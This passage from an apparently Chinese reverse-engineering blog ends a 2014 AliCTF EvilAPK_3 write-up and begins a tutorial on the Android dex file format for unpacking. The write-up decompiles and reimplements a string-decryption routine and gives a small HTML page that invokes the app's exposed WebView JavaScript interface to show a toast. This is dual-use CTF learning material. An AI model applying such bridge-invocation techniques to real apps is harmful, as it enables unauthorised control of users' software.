class="comment">// r2</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *table; <span class="comment">// r3</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v7; <span class="comment">// r7</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// r1</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// r5</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// r10</span></span><br><span class="line">  <span class="keyword">char</span> v13; <span class="comment">// r3</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// r5</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> result; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v16; <span class="comment">// r9</span></span><br><span class="line">  <span class="keyword">int</span> ch; <span class="comment">// r3</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [sp+4h] [bp-64h]</span></span><br><span class="line">  <span class="keyword">char</span> v19; <span class="comment">// [sp+48h] [bp-20h]</span></span><br><span class="line"></span><br><span class="line">  ciphertext_1 = ciphertext;</span><br><span class="line">  plaintext_1 = plaintext;</span><br><span class="line">  len = <span class="built_in">strlen</span>(ciphertext);</span><br><span class="line">  v5 = &amp;s;</span><br><span class="line">  table = <span class="string">"ncA8DaUPelq*S7Y9q#hLl0T##@XTuXHQpFA&amp;65eaUaY33WigYMXO9y7JtCQU"</span>;</span><br><span class="line">  v7 = len;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v8 = *(_DWORD *)table;</span><br><span class="line">    table += <span class="number">8</span>;</span><br><span class="line">    v9 = *((_DWORD *)table - <span class="number">1</span>);</span><br><span class="line">    *(_DWORD *)v5 = v8;</span><br><span class="line">    *((_DWORD *)v5 + <span class="number">1</span>) = v9;</span><br><span class="line">    v10 = (<span class="keyword">int</span>)(v5 + <span class="number">8</span>);</span><br><span class="line">    v5 += <span class="number">8</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( table != <span class="string">"tCQU"</span> );</span><br><span class="line">  v11 = *(_DWORD *)table;</span><br><span class="line">  v12 = <span class="number">0</span>;</span><br><span class="line">  v13 = table[<span class="number">4</span>];</span><br><span class="line">  *(_DWORD *)v10 = v11;</span><br><span class="line">  *(_BYTE *)(v10 + <span class="number">4</span>) = v13;</span><br><span class="line">  i = <span class="number">0</span>;</span><br><span class="line">  result = <span class="built_in">strlen</span>(&amp;s);</span><br><span class="line">  v16 = result;</span><br><span class="line">  <span class="keyword">while</span> ( i &lt; v7 )</span><br><span class="line">  &#123;</span><br><span class="line">    ch = (<span class="keyword">unsigned</span> __int8)ciphertext_1[i];</span><br><span class="line">    <span class="keyword">if</span> ( ch - <span class="number">32</span> &lt;= (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">'^'</span> )         <span class="comment">// chr(ch) &lt;= 127</span></span><br><span class="line">    &#123;</span><br><span class="line">      plaintext_1[i] = (ch - (<span class="keyword">unsigned</span> __int8)*(&amp;v19 + v12 - <span class="number">68</span>) + <span class="number">95</span>) % <span class="number">95</span> + <span class="number">32</span>;<span class="comment">// &amp;v19 - 68 = &amp;table</span></span><br><span class="line">      result = (v12 + <span class="number">1</span>) / v16;</span><br><span class="line">      v12 = (v12 + <span class="number">1</span>) % v16;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>                                        <span class="comment">// chr(ch) &gt; 127</span></span><br><span class="line">    &#123;</span><br><span class="line">      plaintext_1[i] = ch;</span><br><span class="line">    &#125;</span><br><span class="line">    ++i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我先是通过动态调试来获取到了两个字符串的解密结果：</p><p><img src="/pics/2014-AliCTF-EvilAPK_3/5.png" alt="`dV.`的解密结果"></p><p><img src="/pics/2014-AliCTF-EvilAPK_3/6.png" alt="第二个字符串的解密结果"></p><p>然后尝试自己实现一个解密函数进行验证：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *table = <span class="string">"ncA8DaUPelq*S7Y9q#hLl0T##@XTuXHQpFA&amp;65eaUaY33WigYMXO9y7JtCQU"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">vigenere_decrypt</span><span class="params">(<span class="keyword">char</span> *ciphertext)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> len = <span class="built_in">strlen</span>(ciphertext);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>, len);</span><br><span class="line"><span class="keyword">char</span> plaintext[len];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line"><span class="keyword">char</span> ch = ciphertext[i];</span><br><span class="line"><span class="keyword">if</span> ((ch - <span class="number">32</span>) &lt;= <span class="number">0x5E</span>) &#123;</span><br><span class="line">plaintext[i] = (ch - table[j] + <span class="number">95</span>) % <span class="number">95</span> + <span class="number">32</span>;</span><br><span class="line">j = (j + <span class="number">1</span>) % <span class="number">16</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">plaintext[i] = ch;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">plaintext[len] = '\x00';</span><br><span class="line"><span class="keyword">return</span> plaintext;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span> *ciphertext1 = <span class="string">"dV."</span>;</span><br><span class="line"><span class="keyword">char</span> *plaintext1 = vigenere_decrypt(ciphertext1);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s\n"</span>, plaintext1); <span class="comment">// url</span></span><br><span class="line"><span class="keyword">char</span> *ciphertext2 = <span class="string">"BQ1$*[w6G_"</span>;</span><br><span class="line"><span class="keyword">char</span> *plaintext2 = vigenere_decrypt(ciphertext2);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s\n"</span>, plaintext2); <span class="comment">// SmokeyBear</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然这里也可以 Hook 这个 so 文件，也可以直接编写代码调用 so 中的函数，条条大路通罗马。最后实现一个调用 Toast 的 html 页面：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=UTF-8"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">      function alicrack() &#123;</span></span><br><span class="line"><span class="undefined">        SmokeyBear.showToast();</span></span><br><span class="line"><span class="undefined">      &#125;</span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    Crack EvilAPK_3</span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">      alicrack();</span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在软件中输入对应的地址，成功弹窗：</p><p><img src="/pics/2014-AliCTF-EvilAPK_3/7.png" alt="成功弹窗"></p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://xz.aliyun.com/t/383" target="_blank" rel="noopener">https://xz.aliyun.com/t/383</a><br><a href="https://blog.csdn.net/AliMobileSecurity/article/details/53259788" target="_blank" rel="noopener">https://blog.csdn.net/AliMobileSecurity/article/details/53259788</a><br><a href="https://yq.aliyun.com/articles/64691" target="_blank" rel="noopener">https://yq.aliyun.com/articles/64691</a><br><a href="http://pwn4.fun/2017/04/04/Android%E9%80%86%E5%90%91%E4%B9%8B%E8%84%B1%E5%A3%B3/" target="_blank" rel="noopener">http://pwn4.fun/2017/04/04/Android%E9%80%86%E5%90%91%E4%B9%8B%E8%84%B1%E5%A3%B3/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;接触了一段时间的安卓后复现一下经典的题目，具体审计还有分析的步骤不做记录。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="re" scheme="blog.b3ale.cn/tags/re/"/>
    
      <category term="android" scheme="blog.b3ale.cn/tags/android/"/>
    
  </entry>
  
  <entry>
    <title>Android逆向入门（四）</title>
    <link href="blog.b3ale.cn/2020/02/14/%5BTODO%5DAndroid%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8%EF%BC%88%E5%9B%9B%EF%BC%89/"/>
    <id>blog.b3ale.cn/2020/02/14/%5BTODO%5DAndroid%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8%EF%BC%88%E5%9B%9B%EF%BC%89/</id>
    <published>2020-02-14T06:21:40.000Z</published>
    <updated>2020-02-25T07:02:46.565Z</updated>
    
    <content type="html"><![CDATA[<p>Android 加壳和脱壳入门。</p><a id="more"></a><h1 id="dex-文件格式"><a href="#dex-文件格式" class="headerlink" title="dex 文件格式"></a>dex 文件格式</h1><p>Android 程序编译以后生成 apk 文件，里面的 classes.dex 文件存放着程序运行的字节码，dex 文件是可以直接在 Dalvik 虚拟机中加载运行的文件。由于 Dalvik 是一种针对嵌入式设备而特殊设计的 Java 虚拟机，所以 dex 文件与标准的 class 文件在结构设计上有着本质的区别。当 Java 程序编译成 class 后，还需要使用 dx 工具将所有的 class 文件整合到一个 dex 文件，目的是其中各个类能够共享数据，在一定程度上降低了冗余，同时也是文件结构更加经凑，dex 文件是传统 jar 文件大小的 50% 左右。要想手工脱壳，必须先了解 dex 的文件格式。</p><p><img src="/pics/Android逆向入门/四/1.png" alt="dex文件和class文件的区别"></p><p>ShakaApktool 使用 bs 命令即可对 class.dex 实现反编译回 smali 文件字节码，而使用 s 命令可以把 smali 字节码编译为 class.dex 文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -jar ShakaApktool bs classes.dex -o smali-dir</span><br><span class="line">java -jar ShakaApktool s smali-dir -o example.dex</span><br></pre></td></tr></table></figure><p>dex 文件的数据结构大概如下：</p><table><thead><tr><th style="text-align:center">数据名称</th><th style="text-align:center">解释</th></tr></thead><tbody><tr><td style="text-align:center">header</td><td style="text-align:center">dex 文件头部，记录整个 dex 文件的相关属性</td></tr><tr><td style="text-align:center">string_ids</td><td style="text-align:center">字符串数据索引，记录了每个字符串在数据区的偏移量</td></tr><tr><td style="text-align:center">type_ids</td><td style="text-align:center">类似数据索引，记录了每个类型的字符串索引</td></tr><tr><td style="text-align:center">proto_ids</td><td style="text-align:center">原型数据索引，记录了方法声明的字符串，返回类型字符串，参数列表</td></tr><tr><td style="text-align:center">field_ids</td><td style="text-align:center">字段数据索引，记录了所属类，类型以及方法名</td></tr><tr><td style="text-align:center">method_ids</td><td style="text-align:center">类方法索引，记录方法所属类名，方法声明以及方法名等信息</td></tr><tr><td style="text-align:center">class_defs</td><td style="text-align:center">类定义数据索引，记录指定类各类信息，包括接口，超类，类数据偏移量</td></tr><tr><td style="text-align:center">data</td><td style="text-align:center">数据区，保存了各个类的真是数据</td></tr><tr><td style="text-align:center">link_data</td><td style="text-align:center">连接数据区</td></tr></tbody></table><p>这里先看一下 Android 源码，首先在 <a href="http://androidxref.com/4.1.1/xref/dalvik/vm/Common.h" target="_blank" rel="noopener">/dalvik/vm/Common.h</a> 中对数据类型有一个重命名：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * These match the definitions in the VM specification.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint8_t</span>             u1;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint16_t</span>            u2;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint32_t</span>            u4;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint64_t</span>            u8;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int8_t</span>              s1;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int16_t</span>             s2;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int32_t</span>             s4;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int64_t</span>             s8;</span><br></pre></td></tr></table></figure><p>所有 dex 文件相关的数据结构都在 <a href="http://androidxref.com/4.1.1/xref/dalvik/libdex/DexFile.h" target="_blank" rel="noopener">/dalvik/libdex/DexFile.h</a> 中。dex 文件的结构如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Structure representing a DEX file.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Code should regard DexFile as opaque, using the API calls provided here</span></span><br><span class="line"><span class="comment"> * to access specific structures.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexFile</span> &#123;</span></span><br><span class="line">    <span class="comment">/* directly-mapped "opt" header */</span></span><br><span class="line">    <span class="keyword">const</span> DexOptHeader* pOptHeader;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* pointers to directly-mapped structs and arrays in base DEX */</span></span><br><span class="line">    <span class="keyword">const</span> DexHeader*    pHeader;</span><br><span class="line">    <span class="keyword">const</span> DexStringId*  pStringIds;</span><br><span class="line">    <span class="keyword">const</span> DexTypeId*    pTypeIds;</span><br><span class="line">    <span class="keyword">const</span> DexFieldId*   pFieldIds;</span><br><span class="line">    <span class="keyword">const</span> DexMethodId*  pMethodIds;</span><br><span class="line">    <span class="keyword">const</span> DexProtoId*   pProtoIds;</span><br><span class="line">    <span class="keyword">const</span> DexClassDef*  pClassDefs;</span><br><span class="line">    <span class="keyword">const</span> DexLink*      pLinkData;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * These are mapped out of the "auxillary" section, and may not be</span></span><br><span class="line"><span class="comment">     * included in the file.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">const</span> DexClassLookup* pClassLookup;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">void</span>*         pRegisterMapPool;       <span class="comment">// RegisterMapClassPool</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* points to start of DEX file data */</span></span><br><span class="line">    <span class="keyword">const</span> u1*           baseAddr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* track memory overhead for auxillary structures */</span></span><br><span class="line">    <span class="keyword">int</span>                 overhead;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* additional app-specific data structures associated with the DEX */</span></span><br><span class="line">    <span class="comment">//void*               auxData;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>dex 文件结构分别为文件头、索引区和数据区：</p><p><img src="/pics/Android逆向入门/四/2.png" alt="dex文件结构"></p><h2 id="dex-文件头"><a href="#dex-文件头" class="headerlink" title="dex 文件头"></a>dex 文件头</h2><p>文件头中简单记录了 dex 文件的一些基本信息，以及大致的数据分布。长度固定为 0x70，其中每一项信息所占用的内存空间也是固定的，好处是虚拟机在处理 dex 时不用考虑 dex 文件的多样性：</p><table><thead><tr><th style="text-align:center">字段名称</th><th style="text-align:center">偏移值</th><th style="text-align:center">长度</th><th style="text-align:center">说明</th></tr></thead><tbody><tr><td style="text-align:center">magic</td><td style="text-align:center">0x00</td><td style="text-align:center">8</td><td style="text-align:center">魔数字段，值为”dex\n035\0”</td></tr><tr><td style="text-align:center">checksum</td><td style="text-align:center">0x08</td><td style="text-align:center">4</td><td style="text-align:center">校验码</td></tr><tr><td style="text-align:center">signature</td><td style="text-align:center">0x0c</td><td style="text-align:center">20</td><td style="text-align:center">sha-1 签名</td></tr><tr><td style="text-align:center">file_size</td><td style="text-align:center">0x20</td><td style="text-align:center">4</td><td style="text-align:center">dex 文件总长度</td></tr><tr><td style="text-align:center">header_size</td><td style="text-align:center">0x24</td><td style="text-align:center">4</td><td style="text-align:center">文件头长度，009 版本=0x5c,035 版本=0x70</td></tr><tr><td style="text-align:center">endian_tag</td><td style="text-align:center">0x28</td><td style="text-align:center">4</td><td style="text-align:center">标示字节顺序的常量</td></tr><tr><td style="text-align:center">link_size</td><td style="text-align:center">0x2c</td><td style="text-align:center">4</td><td style="text-align:center">链接段的大小，如果为 0 就是静态链接</td></tr><tr><td style="text-align:center">link_off</td><td style="text-align:center">0x30</td><td style="text-align:center">4</td><td style="text-align:center">链接段的开始位置</td></tr><tr><td style="text-align:center">map_off</td><td style="text-align:center">0x34</td><td style="text-align:center">4</td><td style="text-align:center">map 数据基址</td></tr><tr><td style="text-align:center">string_ids_size</td><td style="text-align:center">0x38</td><td style="text-align:center">4</td><td style="text-align:center">字符串列表中字符串个数</td></tr><tr><td style="text-align:center">string_ids_off</td><td style="text-align:center">0x3c</td><td style="text-align:center">4</td><td style="text-align:center">字符串列表基址</td></tr><tr><td style="text-align:center">type_ids_size</td><td style="text-align:center">0x40</td><td style="text-align:center">4</td><td style="text-align:center">类列表里的类型个数</td></tr><tr><td style="text-align:center">type_ids_off</td><td style="text-align:center">0x44</td><td style="text-align:center">4</td><td style="text-align:center">类列表基址</td></tr><tr><td style="text-align:center">proto_ids_size</td><td style="text-align:center">0x48</td><td style="text-align:center">4</td><td style="text-align:center">原型列表里面的原型个数</td></tr><tr><td style="text-align:center">proto_ids_off</td><td style="text-align:center">0x4c</td><td style="text-align:center">4</td><td style="text-align:center">原型列表基址</td></tr><tr><td style="text-align:center">field_ids_size</td><td style="text-align:center">0x50</td><td style="text-align:center">4</td><td style="text-align:center">字段个数</td></tr><tr><td style="text-align:center">field_ids_off</td><td style="text-align:center">0x54</td><td style="text-align:center">4</td><td style="text-align:center">字段列表基址</td></tr><tr><td style="text-align:center">method_ids_size</td><td style="text-align:center">0x58</td><td style="text-align:center">4</td><td style="text-align:center">方法个数</td></tr><tr><td style="text-align:center">method_ids_off</td><td style="text-align:center">0x5c</td><td style="text-align:center">4</td><td style="text-align:center">方法列表基址</td></tr><tr><td style="text-align:center">class_defs_size</td><td style="text-align:center">0x60</td><td style="text-align:center">4</td><td style="text-align:center">类定义标中类的个数</td></tr><tr><td style="text-align:center">class_defs_off</td><td style="text-align:center">0x64</td><td style="text-align:center">4</td><td style="text-align:center">类定义列表基址</td></tr><tr><td style="text-align:center">data_size</td><td style="text-align:center">0x68</td><td style="text-align:center">4</td><td style="text-align:center">数据段的大小，必须 4k 对齐</td></tr><tr><td style="text-align:center">data_off</td><td style="text-align:center">0x6c</td><td style="text-align:center">4</td><td style="text-align:center">数据段基址</td></tr></tbody></table><p>文件头的数据结构如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Direct-mapped "header_item" struct.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexHeader</span> &#123;</span></span><br><span class="line">    u1  magic[<span class="number">8</span>];           <span class="comment">/* includes version number */</span></span><br><span class="line">    u4  checksum;           <span class="comment">/* adler32 checksum */</span></span><br><span class="line">    u1  signature[kSHA1DigestLen]; <span class="comment">/* SHA-1 hash */</span></span><br><span class="line">    u4  fileSize;           <span class="comment">/* length of entire file */</span></span><br><span class="line">    u4  headerSize;         <span class="comment">/* offset to start of next section */</span></span><br><span class="line">    u4  endianTag;</span><br><span class="line">    u4  linkSize;</span><br><span class="line">    u4  linkOff;</span><br><span class="line">    u4  mapOff;</span><br><span class="line">    u4  stringIdsSize;</span><br><span class="line">    u4  stringIdsOff;</span><br><span class="line">    u4  typeIdsSize;</span><br><span class="line">    u4  typeIdsOff;</span><br><span class="line">    u4  protoIdsSize;</span><br><span class="line">    u4  protoIdsOff;</span><br><span class="line">    u4  fieldIdsSize;</span><br><span class="line">    u4  fieldIdsOff;</span><br><span class="line">    u4  methodIdsSize;</span><br><span class="line">    u4  methodIdsOff;</span><br><span class="line">    u4  classDefsSize;</span><br><span class="line">    u4  classDefsOff;</span><br><span class="line">    u4  dataSize;</span><br><span class="line">    u4  dataOff;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="索引区"><a href="#索引区" class="headerlink" title="索引区"></a>索引区</h2><p>索引区包括 string_ids、type_ids、proto_ids、field_ids、method_ids 几个数据结构。数组结构如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Direct-mapped "string_id_item".</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexStringId</span> &#123;</span></span><br><span class="line">    u4 stringDataOff;      <span class="comment">/* file offset to string_data_item */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Direct-mapped "type_id_item".</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexTypeId</span> &#123;</span></span><br><span class="line">    u4  descriptorIdx;      <span class="comment">/* index into stringIds list for type descriptor */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Direct-mapped "field_id_item".</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexFieldId</span> &#123;</span></span><br><span class="line">    u2  classIdx;           <span class="comment">/* index into typeIds list for defining class */</span></span><br><span class="line">    u2  typeIdx;            <span class="comment">/* index into typeIds for field type */</span></span><br><span class="line">    u4  nameIdx;            <span class="comment">/* index into stringIds for field name */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Direct-mapped "method_id_item".</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexMethodId</span> &#123;</span></span><br><span class="line">    u2  classIdx;           <span class="comment">/* index into typeIds list for defining class */</span></span><br><span class="line">    u2  protoIdx;           <span class="comment">/* index into protoIds for method prototype */</span></span><br><span class="line">    u4  nameIdx;            <span class="comment">/* index into stringIds for method name */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Direct-mapped "proto_id_item".</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexProtoId</span> &#123;</span></span><br><span class="line">    u4  shortyIdx;          <span class="comment">/* index into stringIds for shorty descriptor */</span></span><br><span class="line">    u4  returnTypeIdx;      <span class="comment">/* index into typeIds list for return type */</span></span><br><span class="line">    u4  parametersOff;      <span class="comment">/* file offset to type_list for parameter types */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="数据区"><a href="#数据区" class="headerlink" title="数据区"></a>数据区</h2><p>数据段包括 class_defs、data、link_data，数据结构如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Direct-mapped "map_item".</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexMapItem</span> &#123;</span></span><br><span class="line">    u2 type;              <span class="comment">/* type code (see kDexType* above) */</span></span><br><span class="line">    u2 unused;</span><br><span class="line">    u4 